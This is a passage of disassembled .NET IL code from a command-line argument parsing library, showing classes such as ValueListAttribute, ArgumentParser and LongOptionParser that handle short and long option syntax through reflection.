    IL_0037:  ldarg.0
    IL_0038:  ldarg.1
    IL_0039:  stfld      class [mscorlib]System.Type CommandLine.ValueListAttribute::_concreteType
    IL_003e:  ret
  } // end of method ValueListAttribute::.ctor

  .method public hidebysig specialname instance int32 
          get_MaximumElements() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      int32 CommandLine.ValueListAttribute::'<MaximumElements>k__BackingField'
    IL_0006:  ret
  } // end of method ValueListAttribute::get_MaximumElements

  .method public hidebysig specialname instance void 
          set_MaximumElements(int32 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      int32 CommandLine.ValueListAttribute::'<MaximumElements>k__BackingField'
    IL_0007:  ret
  } // end of method ValueListAttribute::set_MaximumElements

  .method assembly hidebysig specialname 
          instance class [mscorlib]System.Type 
          get_ConcreteType() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [mscorlib]System.Type CommandLine.ValueListAttribute::_concreteType
    IL_0006:  ret
  } // end of method ValueListAttribute::get_ConcreteType

  .method assembly hidebysig static class [mscorlib]System.Collections.Generic.IList`1<string> 
          GetReference(object target) cil managed
  {
    // Code size       51 (0x33)
    .maxstack  6
    .locals init ([0] class [mscorlib]System.Type V_0,
             [1] class [mscorlib]System.Reflection.PropertyInfo V_1)
    IL_0000:  ldarg.0
    IL_0001:  ldloca.s   V_0
    IL_0003:  call       class [mscorlib]System.Reflection.PropertyInfo CommandLine.ValueListAttribute::GetProperty(object,
                                                                                                                    class [mscorlib]System.Type&)
    IL_0008:  stloc.1
    IL_0009:  ldloc.1
    IL_000a:  brfalse    IL_0015

    IL_000f:  ldloc.0
    IL_0010:  brtrue     IL_0017

    IL_0015:  ldnull
    IL_0016:  ret

    IL_0017:  ldloc.1
    IL_0018:  ldarg.0
    IL_0019:  ldloc.0
    IL_001a:  call       object [mscorlib]System.Activator::CreateInstance(class [mscorlib]System.Type)
    IL_001f:  ldnull
    IL_0020:  callvirt   instance void [mscorlib]System.Reflection.PropertyInfo::SetValue(object,
                                                                                          object,
                                                                                          object[])
    IL_0025:  ldloc.1
    IL_0026:  ldarg.0
    IL_0027:  ldnull
    IL_0028:  callvirt   instance object [mscorlib]System.Reflection.PropertyInfo::GetValue(object,
                                                                                            object[])
    IL_002d:  castclass  class [mscorlib]System.Collections.Generic.IList`1<string>
    IL_0032:  ret
  } // end of method ValueListAttribute::GetReference

  .method assembly hidebysig static class CommandLine.ValueListAttribute 
          GetAttribute(object target) cil managed
  {
    // Code size       59 (0x3b)
    .maxstack  7
    .locals init ([0] class [mscorlib]System.Collections.Generic.IList`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.ValueListAttribute>> V_0,
             [1] class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.ValueListAttribute> V_1)
    IL_0000:  ldarg.0
    IL_0001:  call       class [mscorlib]System.Collections.Generic.IList`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,!!0>> CommandLine.ReflectionUtil::RetrievePropertyList<class CommandLine.ValueListAttribute>(object)
    IL_0006:  stloc.0
    IL_0007:  ldloc.0
    IL_0008:  brfalse    IL_0018

    IL_000d:  ldloc.0
    IL_000e:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.ICollection`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.ValueListAttribute>>::get_Count()
    IL_0013:  brtrue     IL_001a

    IL_0018:  ldnull
    IL_0019:  ret

    IL_001a:  ldloc.0
    IL_001b:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.ICollection`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.ValueListAttribute>>::get_Count()
    IL_0020:  ldc.i4.1
    IL_0021:  ble        IL_002c

    IL_0026:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor()
    IL_002b:  throw

    IL_002c:  ldloc.0
    IL_002d:  ldc.i4.0
    IL_002e:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.IList`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.ValueListAttribute>>::get_Item(int32)
    IL_0033:  stloc.1
    IL_0034:  ldloc.1
    IL_0035:  callvirt   instance !1 class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.ValueListAttribute>::get_Right()
    IL_003a:  ret
  } // end of method ValueListAttribute::GetAttribute

  .method private hidebysig static class [mscorlib]System.Reflection.PropertyInfo 
          GetProperty(object target,
                      [out] class [mscorlib]System.Type& concreteType) cil managed
  {
    // Code size       75 (0x4b)
    .maxstack  11
    .locals init ([0] class [mscorlib]System.Collections.Generic.IList`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.ValueListAttribute>> V_0,
             [1] class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.ValueListAttribute> V_1)
    IL_0000:  ldarg.1
    IL_0001:  ldnull
    IL_0002:  stind.ref
    IL_0003:  ldarg.0
    IL_0004:  call       class [mscorlib]System.Collections.Generic.IList`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,!!0>> CommandLine.ReflectionUtil::RetrievePropertyList<class CommandLine.ValueListAttribute>(object)
    IL_0009:  stloc.0
    IL_000a:  ldloc.0
    IL_000b:  brfalse    IL_001b

    IL_0010:  ldloc.0
    IL_0011:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.ICollection`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.ValueListAttribute>>::get_Count()
    IL_0016:  brtrue     IL_001d

    IL_001b:  ldnull
    IL_001c:  ret

    IL_001d:  ldloc.0
    IL_001e:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.ICollection`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.ValueListAttribute>>::get_Count()
    IL_0023:  ldc.i4.1
    IL_0024:  ble        IL_002f

    IL_0029:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor()
    IL_002e:  throw

    IL_002f:  ldloc.0
    IL_0030:  ldc.i4.0
    IL_0031:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.IList`1<class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.ValueListAttribute>>::get_Item(int32)
    IL_0036:  stloc.1
    IL_0037:  ldarg.1
    IL_0038:  ldloc.1
    IL_0039:  callvirt   instance !1 class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.ValueListAttribute>::get_Right()
    IL_003e:  callvirt   instance class [mscorlib]System.Type CommandLine.ValueListAttribute::get_ConcreteType()
    IL_0043:  stind.ref
    IL_0044:  ldloc.1
    IL_0045:  callvirt   instance !0 class CommandLine.Pair`2<class [mscorlib]System.Reflection.PropertyInfo,class CommandLine.ValueListAttribute>::get_Left()
    IL_004a:  ret
  } // end of method ValueListAttribute::GetProperty

  .property instance int32 MaximumElements()
  {
    .get instance int32 CommandLine.ValueListAttribute::get_MaximumElements()
    .set instance void CommandLine.ValueListAttribute::set_MaximumElements(int32)
  } // end of property ValueListAttribute::MaximumElements
  .property instance class [mscorlib]System.Type
          ConcreteType()
  {
    .get instance class [mscorlib]System.Type CommandLine.ValueListAttribute::get_ConcreteType()
  } // end of property ValueListAttribute::ConcreteType
} // end of class CommandLine.ValueListAttribute

.class private auto ansi sealed CommandLine.ParserState
       extends [mscorlib]System.Enum
{
  .custom instance void [mscorlib]System.FlagsAttribute::.ctor() = ( 01 00 00 00 ) 
  .field public specialname rtspecialname uint16 value__
  .field public static literal valuetype CommandLine.ParserState Success = uint16(0x0001)
  .field public static literal valuetype CommandLine.ParserState Failure = uint16(0x0002)
  .field public static literal valuetype CommandLine.ParserState MoveOnNextElement = uint16(0x0004)
} // end of class CommandLine.ParserState

.class private abstract auto ansi beforefieldinit CommandLine.ArgumentParser
       extends [mscorlib]System.Object
{
  .field private class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> '<PostParsingState>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method family hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       18 (0x12)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError>::.ctor()
    IL_000c:  call       instance void CommandLine.ArgumentParser::set_PostParsingState(class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError>)
    IL_0011:  ret
  } // end of method ArgumentParser::.ctor

  .method public hidebysig newslot abstract virtual 
          instance valuetype CommandLine.ParserState 
          Parse(class CommandLine.IArgumentEnumerator argumentEnumerator,
                class CommandLine.OptionMap map,
                object options) cil managed
  {
  } // end of method ArgumentParser::Parse

  .method public hidebysig specialname instance class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> 
          get_PostParsingState() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> CommandLine.ArgumentParser::'<PostParsingState>k__BackingField'
    IL_0006:  ret
  } // end of method ArgumentParser::get_PostParsingState

  .method private hidebysig specialname instance void 
          set_PostParsingState(class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> CommandLine.ArgumentParser::'<PostParsingState>k__BackingField'
    IL_0007:  ret
  } // end of method ArgumentParser::set_PostParsingState

  .method family hidebysig instance void 
          DefineOptionThatViolatesFormat(class CommandLine.OptionInfo option) cil managed
  {
    // Code size       30 (0x1e)
    .maxstack  11
    IL_0000:  ldarg.0
    IL_0001:  call       instance class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> CommandLine.ArgumentParser::get_PostParsingState()
    IL_0006:  ldarg.1
    IL_0007:  callvirt   instance string CommandLine.OptionInfo::get_ShortName()
    IL_000c:  ldarg.1
    IL_000d:  callvirt   instance string CommandLine.OptionInfo::get_LongName()
    IL_0012:  ldc.i4.1
    IL_0013:  newobj     instance void CommandLine.ParsingError::.ctor(string,
                                                                       string,
                                                                       bool)
    IL_0018:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError>::Add(!0)
    IL_001d:  ret
  } // end of method ArgumentParser::DefineOptionThatViolatesFormat

  .method public hidebysig static class CommandLine.ArgumentParser 
          Create(string argument,
                 [opt] bool ignoreUnknownArguments) cil managed
  {
    .param [2] = bool(false)
    // Code size       77 (0x4d)
    .maxstack  7
    IL_0000:  ldarg.0
    IL_0001:  ldstr      "-"
    IL_0006:  ldc.i4.2
    IL_0007:  callvirt   instance bool [mscorlib]System.String::Equals(string,
                                                                       valuetype [mscorlib]System.StringComparison)
    IL_000c:  brfalse    IL_0013

    IL_0011:  ldnull
    IL_0012:  ret

    IL_0013:  ldarg.0
    IL_0014:  ldc.i4.0
    IL_0015:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
    IL_001a:  ldc.i4.s   45
    IL_001c:  bne.un     IL_0036

    IL_0021:  ldarg.0
    IL_0022:  ldc.i4.1
    IL_0023:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
    IL_0028:  ldc.i4.s   45
    IL_002a:  bne.un     IL_0036

    IL_002f:  ldarg.1
    IL_0030:  newobj     instance void CommandLine.LongOptionParser::.ctor(bool)
    IL_0035:  ret

    IL_0036:  ldarg.0
    IL_0037:  ldc.i4.0
    IL_0038:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
    IL_003d:  ldc.i4.s   45
    IL_003f:  bne.un     IL_004b

    IL_0044:  ldarg.1
    IL_0045:  newobj     instance void CommandLine.OptionGroupParser::.ctor(bool)
    IL_004a:  ret

    IL_004b:  ldnull
    IL_004c:  ret
  } // end of method ArgumentParser::Create

  .method public hidebysig static bool  IsInputValue(string argument) cil managed
  {
    // Code size       48 (0x30)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0006:  ldc.i4.0
    IL_0007:  ble        IL_002e

    IL_000c:  ldarg.0
    IL_000d:  ldstr      "-"
    IL_0012:  ldc.i4.2
    IL_0013:  callvirt   instance bool [mscorlib]System.String::Equals(string,
                                                                       valuetype [mscorlib]System.StringComparison)
    IL_0018:  brtrue     IL_002c

    IL_001d:  ldarg.0
    IL_001e:  ldc.i4.0
    IL_001f:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
    IL_0024:  ldc.i4.s   45
    IL_0026:  ceq
    IL_0028:  ldc.i4.0
    IL_0029:  ceq
    IL_002b:  ret

    IL_002c:  ldc.i4.1
    IL_002d:  ret

    IL_002e:  ldc.i4.1
    IL_002f:  ret
  } // end of method ArgumentParser::IsInputValue

  .method family hidebysig static class [mscorlib]System.Collections.Generic.IList`1<string> 
          GetNextInputValues(class CommandLine.IArgumentEnumerator ae) cil managed
  {
    // Code size       66 (0x42)
    .maxstack  8
    .locals init ([0] class [mscorlib]System.Collections.Generic.IList`1<string> V_0)
    IL_0000:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<string>::.ctor()
    IL_0005:  stloc.0
    IL_0006:  br         IL_0027

    IL_000b:  ldarg.0
    IL_000c:  callvirt   instance string CommandLine.IArgumentEnumerator::get_Current()
    IL_0011:  call       bool CommandLine.ArgumentParser::IsInputValue(string)
    IL_0016:  brfalse    IL_002f

    IL_001b:  ldloc.0
    IL_001c:  ldarg.0
    IL_001d:  callvirt   instance string CommandLine.IArgumentEnumerator::get_Current()
    IL_0022:  callvirt   instance void class [mscorlib]System.Collections.Generic.ICollection`1<string>::Add(!0)
    IL_0027:  ldarg.0
    IL_0028:  callvirt   instance bool CommandLine.IArgumentEnumerator::MoveNext()
    IL_002d:  brtrue.s   IL_000b

    IL_002f:  ldarg.0
    IL_0030:  callvirt   instance bool CommandLine.IArgumentEnumerator::MovePrevious()
    IL_0035:  brtrue     IL_0040

    IL_003a:  newobj     instance void CommandLine.CommandLineParserException::.ctor()
    IL_003f:  throw

    IL_0040:  ldloc.0
    IL_0041:  ret
  } // end of method ArgumentParser::GetNextInputValues

  .method public hidebysig static bool  CompareShort(string argument,
                                                     string option,
                                                     bool caseSensitive) cil managed
  {
    // Code size       25 (0x19)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldstr      "-"
    IL_0006:  ldarg.1
    IL_0007:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_000c:  ldarg.2
    IL_000d:  ldc.i4.0
    IL_000e:  ceq
    IL_0010:  call       int32 [mscorlib]System.String::Compare(string,
                                                                string,
                                                                bool)
    IL_0015:  ldc.i4.0
    IL_0016:  ceq
    IL_0018:  ret
  } // end of method ArgumentParser::CompareShort

  .method public hidebysig static bool  CompareLong(string argument,
                                                    string option,
                                                    bool caseSensitive) cil managed
  {
    // Code size       25 (0x19)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldstr      "--"
    IL_0006:  ldarg.1
    IL_0007:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_000c:  ldarg.2
    IL_000d:  ldc.i4.0
    IL_000e:  ceq
    IL_0010:  call       int32 [mscorlib]System.String::Compare(string,
                                                                string,
                                                                bool)
    IL_0015:  ldc.i4.0
    IL_0016:  ceq
    IL_0018:  ret
  } // end of method ArgumentParser::CompareLong

  .method family hidebysig static valuetype CommandLine.ParserState 
          BooleanToParserState(bool 'value') cil managed
  {
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldc.i4.0
    IL_0002:  call       valuetype CommandLine.ParserState CommandLine.ArgumentParser::BooleanToParserState(bool,
                                                                                                            bool)
    IL_0007:  ret
  } // end of method ArgumentParser::BooleanToParserState

  .method family hidebysig static valuetype CommandLine.ParserState 
          BooleanToParserState(bool 'value',
                               bool addMoveNextIfTrue) cil managed
  {
    // Code size       24 (0x18)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  brfalse    IL_000e

    IL_0006:  ldarg.1
    IL_0007:  brtrue     IL_000e

    IL_000c:  ldc.i4.1
    IL_000d:  ret

    IL_000e:  ldarg.0
    IL_000f:  brfalse    IL_0016

    IL_0014:  ldc.i4.5
    IL_0015:  ret

    IL_0016:  ldc.i4.2
    IL_0017:  ret
  } // end of method ArgumentParser::BooleanToParserState

  .method family hidebysig static void  EnsureOptionAttributeIsArrayCompatible(class CommandLine.OptionInfo option) cil managed
  {
    // Code size       18 (0x12)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance bool CommandLine.OptionInfo::get_IsAttributeArrayCompatible()
    IL_0006:  brtrue     IL_0011

    IL_000b:  newobj     instance void CommandLine.CommandLineParserException::.ctor()
    IL_0010:  throw

    IL_0011:  ret
  } // end of method ArgumentParser::EnsureOptionAttributeIsArrayCompatible

  .method family hidebysig static void  EnsureOptionArrayAttributeIsNotBoundToScalar(class CommandLine.OptionInfo option) cil managed
  {
    // Code size       29 (0x1d)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance bool CommandLine.OptionInfo::get_IsArray()
    IL_0006:  brtrue     IL_001c

    IL_000b:  ldarg.0
    IL_000c:  callvirt   instance bool CommandLine.OptionInfo::get_IsAttributeArrayCompatible()
    IL_0011:  brfalse    IL_001c

    IL_0016:  newobj     instance void CommandLine.CommandLineParserException::.ctor()
    IL_001b:  throw

    IL_001c:  ret
  } // end of method ArgumentParser::EnsureOptionArrayAttributeIsNotBoundToScalar

  .property instance class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError>
          PostParsingState()
  {
    .get instance class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> CommandLine.ArgumentParser::get_PostParsingState()
    .set instance void CommandLine.ArgumentParser::set_PostParsingState(class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError>)
  } // end of property ArgumentParser::PostParsingState
} // end of class CommandLine.ArgumentParser

.class public auto ansi sealed beforefieldinit CommandLine.BadOptionInfo
       extends [mscorlib]System.Object
{
  .field private string '<ShortName>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .field private string '<LongName>k__BackingField'
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .method assembly hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method BadOptionInfo::.ctor

  .method assembly hidebysig specialname rtspecialname 
          instance void  .ctor(string shortName,
                               string longName) cil managed
  {
    // Code size       21 (0x15)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.1
    IL_0008:  call       instance void CommandLine.BadOptionInfo::set_ShortName(string)
    IL_000d:  ldarg.0
    IL_000e:  ldarg.2
    IL_000f:  call       instance void CommandLine.BadOptionInfo::set_LongName(string)
    IL_0014:  ret
  } // end of method BadOptionInfo::.ctor

  .method public hidebysig specialname instance string 
          get_ShortName() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      string CommandLine.BadOptionInfo::'<ShortName>k__BackingField'
    IL_0006:  ret
  } // end of method BadOptionInfo::get_ShortName

  .method assembly hidebysig specialname 
          instance void  set_ShortName(string 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      string CommandLine.BadOptionInfo::'<ShortName>k__BackingField'
    IL_0007:  ret
  } // end of method BadOptionInfo::set_ShortName

  .method public hidebysig specialname instance string 
          get_LongName() cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      string CommandLine.BadOptionInfo::'<LongName>k__BackingField'
    IL_0006:  ret
  } // end of method BadOptionInfo::get_LongName

  .method assembly hidebysig specialname 
          instance void  set_LongName(string 'value') cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  stfld      string CommandLine.BadOptionInfo::'<LongName>k__BackingField'
    IL_0007:  ret
  } // end of method BadOptionInfo::set_LongName

  .property instance string ShortName()
  {
    .get instance string CommandLine.BadOptionInfo::get_ShortName()
    .set instance void CommandLine.BadOptionInfo::set_ShortName(string)
  } // end of property BadOptionInfo::ShortName
  .property instance string LongName()
  {
    .get instance string CommandLine.BadOptionInfo::get_LongName()
    .set instance void CommandLine.BadOptionInfo::set_LongName(string)
  } // end of property BadOptionInfo::LongName
} // end of class CommandLine.BadOptionInfo

.class interface private abstract auto ansi CommandLine.IArgumentEnumerator
       implements [mscorlib]System.IDisposable
{
  .method public hidebysig newslot abstract virtual 
          instance string  GetRemainingFromNext() cil managed
  {
  } // end of method IArgumentEnumerator::GetRemainingFromNext

  .method public hidebysig newslot specialname abstract virtual 
          instance string  get_Next() cil managed
  {
  } // end of method IArgumentEnumerator::get_Next

  .method public hidebysig newslot specialname abstract virtual 
          instance bool  get_IsLast() cil managed
  {
  } // end of method IArgumentEnumerator::get_IsLast

  .method public hidebysig newslot abstract virtual 
          instance bool  MoveNext() cil managed
  {
  } // end of method IArgumentEnumerator::MoveNext

  .method public hidebysig newslot abstract virtual 
          instance bool  MovePrevious() cil managed
  {
  } // end of method IArgumentEnumerator::MovePrevious

  .method public hidebysig newslot specialname abstract virtual 
          instance string  get_Current() cil managed
  {
  } // end of method IArgumentEnumerator::get_Current

  .property instance string Next()
  {
    .get instance string CommandLine.IArgumentEnumerator::get_Next()
  } // end of property IArgumentEnumerator::Next
  .property instance bool IsLast()
  {
    .get instance bool CommandLine.IArgumentEnumerator::get_IsLast()
  } // end of property IArgumentEnumerator::IsLast
  .property instance string Current()
  {
    .get instance string CommandLine.IArgumentEnumerator::get_Current()
  } // end of property IArgumentEnumerator::Current
} // end of class CommandLine.IArgumentEnumerator

.class private auto ansi sealed beforefieldinit CommandLine.LongOptionParser
       extends CommandLine.ArgumentParser
{
  .field private initonly bool _ignoreUnkwnownArguments
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(bool ignoreUnkwnownArguments) cil managed
  {
    // Code size       14 (0xe)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void CommandLine.ArgumentParser::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.1
    IL_0008:  stfld      bool CommandLine.LongOptionParser::_ignoreUnkwnownArguments
    IL_000d:  ret
  } // end of method LongOptionParser::.ctor

  .method public hidebysig virtual instance valuetype CommandLine.ParserState 
          Parse(class CommandLine.IArgumentEnumerator argumentEnumerator,
                class CommandLine.OptionMap map,
                object options) cil managed
  {
    // Code size       374 (0x176)
    .maxstack  28
    .locals init ([0] char[] V_0,
             [1] string[] V_1,
             [2] class CommandLine.OptionInfo V_2,
             [3] bool V_3,
             [4] class [mscorlib]System.Collections.Generic.IList`1<string> V_4,
             [5] class [mscorlib]System.Collections.Generic.IList`1<string> V_5)
    IL_0000:  ldarg.1
    IL_0001:  callvirt   instance string CommandLine.IArgumentEnumerator::get_Current()
    IL_0006:  ldc.i4.2
    IL_0007:  callvirt   instance string [mscorlib]System.String::Substring(int32)
    IL_000c:  ldc.i4.1
    IL_000d:  newarr     [mscorlib]System.Char
    IL_0012:  stloc.0
    IL_0013:  ldloc.0
    IL_0014:  ldc.i4.0
    IL_0015:  ldc.i4.s   61
    IL_0017:  stelem.i2
    IL_0018:  ldloc.0
    IL_0019:  ldc.i4.2
    IL_001a:  callvirt   instance string[] [mscorlib]System.String::Split(char[],
                                                                          int32)
    IL_001f:  stloc.1
    IL_0020:  ldarg.2
    IL_0021:  ldloc.1
    IL_0022:  ldc.i4.0
    IL_0023:  ldelem     [mscorlib]System.String
    IL_0028:  callvirt   instance class CommandLine.OptionInfo CommandLine.OptionMap::get_Item(string)
    IL_002d:  stloc.2
    IL_002e:  ldloc.2
    IL_002f:  brtrue     IL_0043

    IL_0034:  ldarg.0
    IL_0035:  ldfld      bool CommandLine.LongOptionParser::_ignoreUnkwnownArguments
    IL_003a:  brtrue     IL_0041

    IL_003f:  ldc.i4.2
    IL_0040:  ret

    IL_0041:  ldc.i4.4
    IL_0042:  ret

    IL_0043:  ldloc.2
    IL_0044:  ldc.i4.1
    IL_0045:  callvirt   instance void CommandLine.OptionInfo::set_IsDefined(bool)
    IL_004a:  ldloc.2
    IL_004b:  call       void CommandLine.ArgumentParser::EnsureOptionArrayAttributeIsNotBoundToScalar(class CommandLine.OptionInfo)
    IL_0050:  ldloc.2
    IL_0051:  callvirt   instance bool CommandLine.OptionInfo::get_IsBoolean()
    IL_0056:  brtrue     IL_014e

    IL_005b:  ldloc.1
    IL_005c:  ldlen
    IL_005d:  conv.i4
    IL_005e:  ldc.i4.1
    IL_005f:  bne.un     IL_0081

    IL_0064:  ldarg.1
    IL_0065:  callvirt   instance bool CommandLine.IArgumentEnumerator::get_IsLast()
    IL_006a:  brtrue     IL_007f

    IL_006f:  ldarg.1
    IL_0070:  callvirt   instance string CommandLine.IArgumentEnumerator::get_Next()
    IL_0075:  call       bool CommandLine.ArgumentParser::IsInputValue(string)
    IL_007a:  brtrue     IL_0081

    IL_007f:  ldc.i4.2
    IL_0080:  ret

    IL_0081:  ldloc.1
    IL_0082:  ldlen
    IL_0083:  conv.i4
    IL_0084:  ldc.i4.2
    IL_0085:  bne.un     IL_00f3

    IL_008a:  ldloc.2
    IL_008b:  callvirt   instance bool CommandLine.OptionInfo::get_IsArray()
    IL_0090:  brtrue     IL_00b8

    IL_0095:  ldloc.2
    IL_0096:  ldloc.1
    IL_0097:  ldc.i4.1
    IL_0098:  ldelem     [mscorlib]System.String
    IL_009d:  ldarg.3
    IL_009e:  callvirt   instance bool CommandLine.OptionInfo::SetValue(string,
                                                                        object)
    IL_00a3:  stloc.3
    IL_00a4:  ldloc.3
    IL_00a5:  brtrue     IL_00b1

    IL_00aa:  ldarg.0
    IL_00ab:  ldloc.2
    IL_00ac:  call       instance void CommandLine.ArgumentParser::DefineOptionThatViolatesFormat(class CommandLine.OptionInfo)
    IL_00b1:  ldloc.3
    IL_00b2:  call       valuetype CommandLine.ParserState CommandLine.ArgumentParser::BooleanToParserState(bool)
    IL_00b7:  ret

    IL_00b8:  ldloc.2
    IL_00b9:  call       void CommandLine.ArgumentParser::EnsureOptionAttributeIsArrayCompatible(class CommandLine.OptionInfo)
    IL_00be:  ldarg.1
    IL_00bf:  call       class [mscorlib]System.Collections.Generic.IList`1<string> CommandLine.ArgumentParser::GetNextInputValues(class CommandLine.IArgumentEnumerator)
    IL_00c4:  stloc.s    V_4
    IL_00c6:  ldloc.s    V_4
    IL_00c8:  ldc.i4.0
    IL_00c9:  ldloc.1
    IL_00ca:  ldc.i4.1
    IL_00cb:  ldelem     [mscorlib]System.String
    IL_00d0:  callvirt   instance void class [mscorlib]System.Collections.Generic.IList`1<string>::Insert(int32,
                                                                                                          !0)
    IL_00d5:  ldloc.2
    IL_00d6:  ldloc.s    V_4
    IL_00d8:  ldarg.3
    IL_00d9:  callvirt   instance bool CommandLine.OptionInfo::SetValue(class [mscorlib]System.Collections.Generic.IList`1<string>,
                                                                        object)
    IL_00de:  stloc.3
    IL_00df:  ldloc.3
    IL_00e0:  brtrue     IL_00ec

    IL_00e5:  ldarg.0
    IL_00e6:  ldloc.2
    IL_00e7:  call       instance void CommandLine.ArgumentParser::DefineOptionThatViolatesFormat(class CommandLine.OptionInfo)
    IL_00ec:  ldloc.3
    IL_00ed:  call       valuetype CommandLine.ParserState CommandLine.ArgumentParser::BooleanToParserState(bool)
    IL_00f2:  ret

    IL_00f3:  ldloc.2
    IL_00f4:  callvirt   instance bool CommandLine.OptionInfo::get_IsArray()
    IL_00f9:  brtrue     IL_0121

